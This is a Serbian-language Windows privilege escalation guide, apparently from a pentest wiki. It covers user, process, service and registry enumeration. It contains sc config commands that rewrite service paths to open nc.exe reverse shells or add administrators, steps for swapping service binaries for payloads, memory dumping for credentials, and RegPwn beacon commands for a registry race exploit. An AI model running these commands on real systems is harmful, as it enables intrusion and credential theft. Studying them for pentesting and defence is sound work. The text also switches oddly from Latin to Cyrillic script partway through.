**Domenske kredencijale** autentifikuje **Lokalni bezbednosni autoritet** (LSA), a koriste ih komponente operativnog sistema. Kada registrovani bezbednosni paket autentifikuje podatke o prijavi korisnika, obično se uspostavljaju domenski kredencijali za tog korisnika.\
[**Više informacija o keširanim kredencijalima ovde**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Korisnici i grupe

### Izlistavanje korisnika i grupa

Trebalo bi da proverite da li neka od grupa čiji ste član ima zanimljive dozvole.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privilegovane grupe

Ako **pripadate nekoj privilegovanoj grupi, možda ćete moći da povećate privilegije**. Ovde saznajte više o privilegovanim grupama i kako da ih zloupotrebite za povećanje privilegija:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulacija tokenima

**Saznajte više** o tome šta je **token** na ovoj stranici: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Pogledajte sledeću stranicu da biste **saznali više o zanimljivim tokenima** i kako da ih zloupotrebite:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Prijavljeni korisnici / sesije

```bash
qwinsta
klist sessions
```

### Korisničke fascikle

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Politika lozinki

```bash
net accounts
```

### Preuzmite sadržaj međuspremnika

```bash
powershell -command "Get-Clipboard"
```

## Pokrenuti procesi

### Dozvole za fajlove i fascikle

Pre svega, prilikom izlistavanja procesa **proverite da li se lozinke nalaze u komandnoj liniji procesa**.\
Proverite da li možete da **prepišete neki pokrenuti binarni fajl** ili imate dozvole za upis u fasciklu sa binarnim fajlovima kako biste iskoristili moguće [**DLL Hijacking attacks**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Uvek proverite da li su možda pokrenuti [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md); možete ih zloupotrebiti za eskalaciju privilegija.

Debugger listener može biti kratkotrajan, pa njegovo odsustvo u jednom pasivnom snimku portova ne dokazuje da nikada nije bio izložen. Povežite svaki uočeni listener sa njegovim PID-om, vlasnikom procesa i mogućnošću pristupa korisnika sa nižim privilegijama; samo ime aplikacije ili debug flag ne potvrđuje izvršavanje koda između korisnika. Rutinsko enumerisanje obavljajte pasivno, umesto da šaljete debugger komande.

**Provera dozvola binarnih datoteka procesa**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Provera dozvola fascikli binarnih datoteka procesa (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dinamički direktorijumi preprocesora

Snort 2 može da učitava deljene biblioteke iz direktorijuma `dynamicpreprocessor directory` navedenog u konfiguraciji izabranoj pomoću `snort.exe -c <config>`. Ako zakazani zadatak ili servis pokreće Snort pod drugim nalogom, pregledajte baš tu konfiguraciju i ACL deklarisanog direktorijuma modula. Ako vaš token može da kreira datoteke u tom direktorijumu, putanja je kandidat za proveru mogućnosti izvršavanja koda pri sledećem učitavanju modula od strane tog zadatka ili servisa. Proverite efektivne privilegije naloga pod kojim se program pokreće, aktivnu konfiguraciju, kompatibilnost modula i eventualna ograničenja zabrane pristupa ili deljenja; sama mogućnost pisanja u direktorijum ne dokazuje eskalaciju. [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) opisuje učitavanje modula tokom izvršavanja.

### Privilegovani web servis sa direktorijumom dokumenata u koji može da se upisuje

Na Windows Apache instalaciji uporedite putanju izvršne datoteke servisa i nalog pod kojim se pokreće sa `DocumentRoot` vrednošću u aktivnoj datoteci `httpd.conf`. Kod uobičajenog XAMPP rasporeda, pregledajte `C:\xampp\apache\conf\httpd.conf` i ACL podešenog korenskog direktorijuma dokumenata, često `C:\xampp\htdocs`. Ako korisnik sa nižim privilegijama može da kreira datoteke u tom direktorijumu dok Apache radi kao `LocalSystem`, izvršavanje koda na serverskoj strani može da pređe granicu privilegija računara. Potvrdite da je servis pokrenut, da se isporučuje sadržaj sa tačne putanje i da obrađivač na serverskoj strani obrađuje taj tip datoteke; mogućnost upisa u korenski direktorijum sama po sebi dokazuje samo kreiranje datoteka. Pregledajte ACL-ove bez upisivanja probne datoteke:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Za standardnu WAMP instalaciju, servis može da pokazuje na verzionisani `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (ili `C:\wamp\...` za 32-bitni raspored), a konfiguracija se nalazi pored njega, u `conf\httpd.conf`, dok je podrazumevani korenski direktorijum `C:\wamp64\www` ili `C:\wamp\www`. Proverite tačnu putanju izvršne datoteke servisa, identitet pod kojim se izvršava, efektivni `DocumentRoot` (uključujući proširivanje `${INSTALL_DIR}` i podešavanja virtuelnih hostova) i ACL korenskog direktorijuma. To što je WAMP direktorijum moguće menjati ne znači da se Apache izvršava kao `SYSTEM` niti da pokreće poslatu datoteku. [Apache dokumentuje kako Windows servis bira svoju konfiguraciju](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Upisiv IIS korenski direktorijum i mrežni identitet aplikacionog pula

Za IIS, povežite fizički direktorijum u koji je moguće pisati sa **aktivnim sajtom/aplikacijom** u `applicationHost.config`, a zatim utvrdite koji su pul i handler na serveru podešeni za tu aplikaciju. Kod smešten u direktorijum koji se isporučuje izvršava se kao aplikacioni pul samo ako IIS obrađuje taj tip datoteke i ako je ruta dostupna. Proverite efektivna prava trenutnog korisnika za kreiranje datoteka, stanje izvršavanja sajta, handler i podešavanja za konkretnu putanju pre nego što direktorijum u koji je moguće pisati smatrate mestom za izvršavanje koda.

Dinamičko kompajliranje ASP.NET-a uvodi zasebnu putanju koju treba proveriti: generisane datoteke u direktorijumu za kompajliranje aplikacije. Podrazumevani direktorijum `Temporary ASP.NET Files` nalazi se ispod odgovarajuće instalacije .NET Framework-a, ali `<compilation tempDirectory>` u aplikaciji može da promeni tu lokaciju. [Microsoft dokumentuje lokaciju i poddirektorijume specifične za aplikaciju](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) i [preporučuje izolovanje direktorijuma za kompajliranje kada aplikacioni pulovi nemaju međusobno poverenje](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ako token sa nižim privilegijama može da menja generisani izvorni kod u kešu **konkretne** aplikacije, utvrdite da li ga ta aplikacija ponovo kompajlira pod privilegovanijim [identitetom radnog procesa](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Sam ACL datoteke ili direktorijuma ne dokazuje izvršavanje koda: povežite keš sa aktivnom aplikacijom, efektivnim tokenom i ACL-om, podešavanjima kompajliranja, identitetom procesa i vremenom eventualnog ponovnog kompajliranja. Koristite pregled metapodataka samo za čitanje; tokom enumeracije nemojte pokretati kompajliranje niti menjati datoteke keša.

IIS pul podešen na `ApplicationPoolIdentity` ili `NetworkService` obično se autentifikuje prema resursima domena kao **računarski nalog hosta**, iako njegov lokalni token može imati niske privilegije. `LocalSystem` već ima visoke lokalne privilegije, a na mreži takođe koristi računarski nalog; `LocalService` obično koristi anonimne mrežne akreditive. Pul `SpecificUser` koristi umesto toga nalog koji je za njega podešen. [Microsoft dokumentuje ove tipove identiteta](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) i [mrežni identitet aplikacionog pula](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Ako podešavanje identiteta nije navedeno, mogu da se primene podrazumevane vrednosti pula, koje se razlikuju među verzijama IIS-a, zato utvrdite efektivnu konfiguraciju umesto da nagađate na osnovu naziva pula. Ako izvršavanje koda dođe do pula koji na mreži koristi računarski identitet, procenite prava na direktorijumu koja ima **taj konkretan računar**. Za [DCSync](../active-directory-methodology/dcsync.md) potrebna su prava replikacije nad kontekstom imenovanja domena; sama mašinska karta ili uloga hosta ne dokazuju da ta prava postoje. Pasivna enumeracija treba da pregleda konfiguraciju i ACL-ove bez otpremanja datoteke, pokretanja mrežne autentifikacije ili zahtevanja karata.

Kod ASP.NET handlera dostupnog za čitanje koji pokreće pomoćni proces, pratite svaku vrednost izvedenu iz zahteva kroz autentifikaciju, dešifrovanje, validaciju i formiranje komande. Handler koji konkatenira dekodirani token u `ProcessStartInfo("cmd", "/c ...")` može da dozvoli metaznakovima shell-a da promene komandu; [Microsoft dokumentuje specijalne znakove komande `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Utvrdite da li nepouzdani pozivalac zaista može da utiče na dekodiranu vrednost i pristupi handleru, a zatim utvrdite efektivni identitet aplikacionog pula ili impersoniranog korisnika i identitet pod kojim se izvršava podređeni proces. Sama dostupna linija izvornog koda, listener na localhost-u ili slabost formata tokena ne dokazuju privilegovano izvršavanje komandi. Pregledajte izvorni kod i konfiguraciju pula bez slanja falsifikovanih zahteva ili pokretanja pomoćnog procesa tokom pasivne enumeracije.

Kod PHP servisa na Windows-u, putanja kontrolisana zahtevom, prosleđena funkciji [`include` ili `require`](https://www.php.net/manual/en/function.include.php), može da izvrši PHP datoteku koju može da menja korisnik sa nižim privilegijama, pod identitetom radnog procesa. Potvrdite da zahtev može da stigne do te naredbe, da razrešena putanja upućuje na datoteku koju korisnik sa nižim privilegijama može da menja, a radni proces da čita, da primenjena PHP ograničenja putanja dozvoljavaju uključivanje i da se radni proces zaista izvršava sa višim privilegijama. Listener na loopback adresi ili datoteka u koju je moguće pisati sami po sebi ne dokazuju ovaj lanac; tokom pasivne enumeracije pregledajte izvorni kod, identitet servisa i ACL-ove datoteka bez pozivanja krajnje tačke.

### Pronalaženje lozinki u memoriji

Možete da napravite dump memorije pokrenutog procesa pomoću **procdump** iz paketa sysinternals. Servisi kao što je FTP imaju **akreditive u čistom tekstu u memoriji**; pokušajte da napravite dump memorije i pročitate akreditive.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Nesigurne GUI aplikacije

**Aplikacije koje se pokreću kao SYSTEM mogu korisniku omogućiti da pokrene CMD ili pregleda direktorijume.**

Primer: „Windows Help and Support“ (Windows + F1), pretražite „command prompt“ i kliknite na „Click to open Command Prompt“

### Uvoz projektnih datoteka sa privilegijama

Aplikacija koja automatski otvara projekte iz direktorijuma za preuzimanje u koji može da piše korisnik sa nižim privilegijama prelazi granicu poverenja u ulaznim podacima, koristeći nalog uvoznika. Proverite **tačnu putanju za pisanje**, proces ili zadatak koji je otvara, njegov efektivni identitet i verziju parsera. [Istorijski problem u Ghidra-i pri otvaranju/obnavljanju projekta](https://github.com/NationalSecurityAgency/ghidra/issues/71) omogućavao je XML external entities u metapodacima projekta; mrežni entitet na Windows-u mogao je da izazove autentifikaciju naloga koji vrši uvoz ako je to dozvoljeno [pravilima za izlazni SMB i NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). To ukazuje na moguću izloženost akreditiva, ali ne i na neposredan administratorski pristup: odgovor mora da bude iskoristiv kroz zasebnu ovlašćenu ili ranjivu putanju, a trenutne verzije treba proceniti prema stvarnom stanju zakrpa. Tokom pasivne enumeracije ne otvarajte posebno pripremljen projekat; pregledajte tok uvoza i ACL-ove.

## Servisi

Pravo [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) nad objektom Service Control Manager (SCM) odvojeno je od pravā nad postojećim servisom. Uspešan, samo za čitanje, [`OpenSCManager` zahtev za pristup](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) za to pravo ukazuje na nešto što treba proveriti, ali ne dokazuje da se novi servis može pokrenuti. [`CreateService` vraća handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) sa pristupom servisu zatraženim prilikom njegovog kreiranja; naknadno ponovno otvaranje servisa sprovodi zasebnu proveru pristupa i može da ne uspe čak i kada bi se mogao koristiti prvobitni handle. Zasebno proverite efektivni lokalni ili udaljeni token, dodeljena prava handle-a, nalog servisa, pravila pokretanja i putanju do izvršne datoteke. Tokom pasivne enumeracije nemojte kreirati ni pokretati servis.

Za udaljenu putanju instalacije servisa, uporedite ta SCM prava sa deljenim resursom na ciljnom sistemu u koji **ista mrežna prijava** može da upisuje, njegovim osnovnim NTFS ACL-om i lokalnom putanjom do izvršne datoteke koju nalog servisa može da pokrene. Nalog koji nije administrator može da pređe ovu granicu ako postoje neuobičajeno široka SCM prava i putanja za smeštanje datoteke; administratorski deljeni resurs nije nužan uslov. Samo pravo upisa u deljeni resurs ili samo naznaka prava za kreiranje servisa u SCM-u ne dokazuje da se novi servis može pokrenuti sa višim privilegijama.

Postojeći servis može da pozove pomoćnu izvršnu datoteku pri pokretanju, gašenju ili nekom drugom događaju životnog ciklusa, čak i kada ta datoteka ne postoji u njegovom `ImagePath`. Ako se naziv pomoćne datoteke razrešava u direktorijum у koji može da upisuje korisnik sa nižim privilegijama, a servis se pokreće sa višim privilegijama, nedostajuća pomoćna datoteka može biti kandidat za uslovnu zamenu. Potvrdite **stvarni kod servisa ili dokumentovano pozivanje pomoćne datoteke**, razrešenu putanju izvršne datoteke i redosled pretrage, prava za kreiranje direktorijuma, identitet servisa i dostupan okidač životnog ciklusa. Samo direktorijum servisa u koji može da se upisuje ili nedostajuća datoteka ne dokazuju da servis učitava tu datoteku; tokom pasivnog pregleda nemojte pokretati ni zaustavljati servis.

Za postojeći servis, [`SERVICE_START` dozvoljava prosleđivanje argumenata funkciji `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); to se razlikuje od prava [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Pregledajte kod servisa ili njegov dokumentovani interfejs pre nego što pravo pokretanja smatrate nečim više od prava za upravljanje. Ako koristi argument koji je izabrao pozivalac kao putanju za zapisivanje dnevnika ili izvoz, proverite identitet servisa, tačan tok od argumenta do upisa, ograničenja putanje i dozvole nad **kreiranom datotekom**. Upis u zaštićeni direktorijum može da dovede do eskalacije samo ako postoji zaseban privilegovani potrošač ili učitavač koji prihvata tu datoteku; sama mogućnost upisa u dnevnik ili pravo pokretanja nisu dovoljni. Pasivna inventarizacija ne bi trebalo da pokreće servis niti da kreira probnu datoteku.

Kod NSClient++ monitoring agenta, čitljiv `nsclient.ini` predstavlja **naznaku za pregled konfiguracije**: može da sadrži akreditive za web pristup, dok `boot.ini` može da preusmeri konfiguraciju na drugu lokaciju. Proverite stvarni nalog servisa, WEB listener i pravila pristupa, kao i to da li autentifikovana uloga može da menja podešavanja ili skripte. Za privilegovano izvršavanje potrebni su i `CheckExternalScripts` (ili neka druga omogućena putanja za izvršavanje), efektivno pravo za registrovanje ili izmenu komande i okidač koji je pokreće pod identitetom servisa. Listener ograničen samo na loopback i dalje može biti dostupan lokalnom korisniku, ali sama putanja do datoteke, lozinka ili listener ne dokazuju postojanje tih prava. Tokom pasivne enumeracije pregledajte metapodatke i dozvole, ali nemojte prikazivati tajne niti pozivati web API. Pogledajte [raspored datoteka NSClient++-a](https://nsclient.org/docs/concepts/file-layout/), [smernice za bezbednost web-a i skripti](https://nsclient.org/docs/setup/securing/) i [konfiguraciju eksternih skripti](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Za servis čiji je `ImagePath` `nssm.exe`, pregledajte stvarni nalog pod kojim se servis pokreće i njegovu vrednost `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM tamo čuva podređenu aplikaciju](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), dok je `AppDirectory` njegov konfigurisani radni direktorijум. Пре него што права над омотачем сматрате целом границом сервиса, проверите подређену извршну датотеку и ACL-ове њеног надређеног директоријума. Локални WCF или SOAP endpoint који та подређена апликација излаже представља засебну назнаку за проверу: потврдите да ли је listener доступан кориснику са нижим привилегијама, да ли тачно одређена операција прихвата његов улаз и да ли подређени процес сервиса извршава небезбедну операцију са вишим привилегијама. Налог сервиса, URL endpoint-а или путања у коју може да се уписује сами по себи не доказују ескалацију; током пасивне enumerације избегавајте позивање операција сервиса.

За прилагођену WCF операцију, пратите стринг који контролише позивалац до било ког PowerShell runspace-а. [`Pipeline.Commands.AddScript` додаје текст скрипте](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), а [`Pipeline.Invoke` покреће pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` са Windows транспортним акредитивима](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) аутентификује клијента, али овлашћење за позивање те **конкретне** операције и ефективни идентитет runspace-а морају се проверити засебно. Путања од улаза позиваоца са нижим привилегијама до `AddScript`-а који се извршава под вишим идентитетом сервиса представља границу за извршавање кода; сам порт који слуша, аутентификовани клијент или некоришћена метода у неповезаном склопу не представљају доказ. Током enumerације статички прегледајте инсталирани сервис, уговор, овлашћења и подешавања impersonation-а, без позивања endpoint-а.

Service Triggers омогућавају Windows-у да покрене сервис када наступе одређени услови (активност именоване цеви/RPC endpoint-а, ETW догађаји, доступност IP-а, прикључење уређаја, освежавање GPO-а итд.). Чак и без права SERVICE_START, често можете покренути привилеговане сервисе активирањем њихових окидача. Технике за enumerацију и активирање потражите овде:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Сервис за прикупљање дијагностичких података Visual Studio-а

Инсталације Visual Studio-а са C/C++ алатима могу да садрже `VSStandardCollectorService150`, дијагностички сервис конфигурисан да се покреће као `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) користио је junction и трку са object-manager-link-ом за преусмеравање ресетовања DACL-а сервиса. Демонстрирана ескалација захтевала је и употребљиву путању за поправку MSI-ја Visual Studio Setup WMI Provider-а, као и њен циљ `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Компонента је исправљена у јануару 2024.

За пасивну тријажу проверите налог тог сервиса и путању до његове бинарне датотеке, утврдите да ли путања до Setup WMI компајлера постоји и проверите стање закрпа инсталиране компоненте. Ставка сервиса, верзија Visual Studio производа или сама датотека компајлера не доказују да је систем рањив. За проверу није потребно покретати сервис нити покретати поправку.

Набавите листу сервиса:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Dozvole

Možete koristiti **sc** da biste dobili informacije o servisu.

```bash
sc qc <service_name>
```

Preporučuje se da imate binarnu datoteku **accesschk** iz paketa _Sysinternals_ kako biste proverili potreban nivo privilegija za svaku uslugu.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Preporučuje se da proverite da li grupa "Authenticated Users" može da menja neku uslugu:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Ovde možete preuzeti accesschk.exe za XP](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Omogućavanje servisa

Ako dobijate ovu grešku (na primer, sa SSDPSRV):

_Došlo je do sistemske greške 1058._\
_Usluga ne može da se pokrene zato što je onemogućena ili zato što nijedan uređaj povezan sa njom nije omogućen._

Možete je omogućiti pomoću

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Imajte u vidu da servis upnphost zavisi od SSDPSRV-a da bi radio (za XP SP1)**

**Drugo zaobilazno rešenje** ovog problema je pokretanje:

```
sc.exe config usosvc start= auto
```

### **Izmena putanje binarne datoteke servisa**

U scenariju u kojem grupa „Authenticated users“ ima **SERVICE_ALL_ACCESS** nad servisom, moguće je izmeniti izvršnu binarnu datoteku servisa. Da biste izmenili i izvršili **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Ponovno pokretanje servisa

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Privilegije se mogu eskalirati pomoću različitih dozvola:

- **SERVICE_CHANGE_CONFIG**: Omogućava ponovno konfigurisanje binarne datoteke servisa.
- **WRITE_DAC**: Omogućava ponovno konfigurisanje dozvola, čime se stiče mogućnost menjanja konfiguracija servisa.
- **WRITE_OWNER**: Omogućava preuzimanje vlasništva i ponovno konfigurisanje dozvola.
- **GENERIC_WRITE**: Nasleđuje mogućnost menjanja konfiguracija servisa.
- **GENERIC_ALL**: Takođe nasleđuje mogućnost menjanja konfiguracija servisa.

Za otkrivanje i eksploataciju ove ranjivosti može se koristiti _exploit/windows/local/service_permissions_.

### Slabe dozvole za binarne datoteke servisa

Ako se servis izvršava kao **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ili privilegovani domenski nalog, ali **korisnici sa niskim privilegijama mogu da menjaju EXE datoteku servisa ili njenu nadređenu fasciklu**, servis se često može preoteti **zamenom binarne datoteke i ponovnim pokretanjem servisa**.

**Proverite da li možete da menjate binarnu datoteku koju servis izvršava** ili imate **dozvole za pisanje u fasciklu** u kojoj se binarna datoteka nalazi ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Možete dobiti sve binarne datoteke koje servis izvršava pomoću **wmic** (ne u system32) i proveriti svoje dozvole pomoću **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Možete koristiti i **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Potražite opasne ACL dozvole dodeljene identitetima **`Everyone`**, **`BUILTIN\Users`** ili **`Authenticated Users`**, naročito **`(F)`**, **`(M)`** ili **`(W)`** za izvršnu datoteku servisa ili direktorijum koji je sadrži. Praktičan tok zloupotrebe je:<sup>[[27]](#references)</sup>

1. Potvrdite nalog servisa i putanju do izvršne datoteke pomoću komande `sc qc <service_name>`.
2. Potvrdite da li je moguće upisivati u binarnu datoteku pomoću komande `icacls <path>`.
3. Zamenite binarnu datoteku servisa payload-om ili važećom zlonamernom binarnom datotekom servisa.
4. Ponovo pokrenite servis pomoću komande `sc stop <service_name> && sc start <service_name>` (ili sačekajte ponovno pokretanje sistema / okidač servisa).

Korisne automatizovane provere:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ako servis ne dozvoljava običnom korisniku da ga ponovo pokrene, proverite da li se automatski pokreće pri pokretanju sistema, da li ima podešenu akciju pri otkazu koja ga ponovo pokreće ili može indirektno da ga pokrene aplikacija koja ga koristi.

### Dozvole za izmenu registra servisa

Trebalo bi da proverite da li možete da izmenite neki registar servisa.\
Možete **proveriti** svoje **dozvole** nad **registrom** servisa pomoću:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Proverite da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju dozvole za upis u ključ registra određenog servisa. Sam ACL unos ne dokazuje da je pristup efektivan: važni su deny unosi, trenutni token i nasleđene dozvole. Prava za ključ registra odvojena su od prava objekta servisa `SERVICE_CHANGE_CONFIG` i `SERVICE_START`. Za eskalaciju su potrebni i upotrebljivo polje konfiguracije servisa, način da se servis pokrene i identitet servisa sa većim privilegijama. Pogledajte Microsoftovu dokumentaciju o [pravima za ključeve registra](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) i [pravima pristupa servisima](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Da biste promenili putanju binarne datoteke koja se izvršava:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Trka sa registry symbolic link-om za proizvoljan upis HKLM vrednosti (ATConfig)

Neke Windows funkcije pristupačnosti kreiraju **ATConfig** ključeve po korisniku, koje kasnije **SYSTEM** proces kopira u HKLM ključ sesije. Trka sa registry **symbolic link-om** može da preusmeri taj privilegovani upis na **bilo koju HKLM putanju**, čime se dobija mogućnost proizvoljnog **upisa HKLM vrednosti**.<sup>[[18]](#references)</sup>

Lokacije ključeva (primer: tastatura na ekranu `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` navodi instalirane funkcije pristupačnosti.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` čuva korisnički kontrolisanu konfiguraciju.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` kreira se tokom prijavljivanja/prelaza na bezbednu radnu površinu i korisnik može da ga upisuje.

Tok zloupotrebe (CVE-2026-24291 / ATConfig):

1. Popunite **HKCU ATConfig** vrednost koju želite da SYSTEM upiše.
2. Pokrenite kopiranje na bezbednu radnu površinu (npr. **LockWorkstation**), čime se pokreće AT broker tok.
3. **Dobijte trku** tako što ćete postaviti **oplock** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; kada se oplock aktivira, zamenite **HKLM Session ATConfig** ključ registry link-om ka zaštićenom HKLM cilju.
4. SYSTEM upisuje vrednost koju je odabrao napadač u preusmerenu HKLM putanju.

Kada dobijete mogućnost proizvoljnog upisa HKLM vrednosti, iskoristite je za LPE tako što ćete prepisati vrednosti konfiguracije servisa:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komandna linija)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Izaberite servis koji običan korisnik može da pokrene (npr. **`msiserver`**) i pokrenite ga nakon upisa. **Napomena:** javna implementacija exploita **zaključava radnu stanicu** kao deo trke.

Primer alata (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Dozvole AppendData/AddSubdirectory za registry servisa

Ako imate ovu dozvolu nad registry-jem, to znači da **možete da kreirate podregistrije u njemu**. U slučaju Windows servisa, ovo je **dovoljno za izvršavanje proizvoljnog koda:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ako putanja do izvršne datoteke nije stavljena pod navodnike, Windows će pokušati da izvrši svaki deo putanje koji se završava pre razmaka.

Na primer, za putanju _C:\Program Files\Some Folder\Service.exe_ Windows će pokušati da izvrši:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Izlistajte sve putanje servisa koje nisu pod navodnicima, izuzimajući one koje pripadaju ugrađenim Windows servisima:

```bash
